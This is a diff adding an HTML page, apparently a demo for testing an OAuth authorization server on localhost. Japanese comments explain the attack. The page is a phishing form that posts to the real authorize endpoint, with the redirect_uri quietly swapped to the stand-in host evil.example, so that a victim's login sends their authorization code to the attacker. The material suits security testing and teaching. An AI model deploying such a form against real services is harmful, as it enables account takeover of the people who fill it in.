@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>Evil Consent Form Demo</title>
+</head>
+<body>
+    <h1>Congratulations!</h1>
+
+    <!--
+        攻撃シナリオ (test_c_code_to_evil_redirect と同じ原理):
+        action は本物の認可サーバーなので、同意画面にそっくりな
+        見た目を自作しなくても、このフォームを直接送信させるだけでよい。
+        redirect_uri だけを攻撃者のサーバーに差し替え、
+        被害者自身の正規ログイン情報の入力を誘導する。
+    -->
+    <form
+        action="http://localhost:4000/authorize"
+        method="POST"
+    >
+        <input type="hidden" name="client_id" value="fortune-app">
+        <input type="hidden" name="redirect_uri" value="https://evil.example/cb">
+        <input type="hidden" name="response_type" value="code">
+        <input type="hidden" name="scope" value="profile:basic">
+
+        <!-- 被害者が実際に入力する欄だけ残す -->
+        <input type="text" name="username" placeholder="ユーザー名">
+        <input type="password" name="password" placeholder="パスワード">
+        <button type="submit">ログイン</button>
+    </form>
+</body>
+</html>
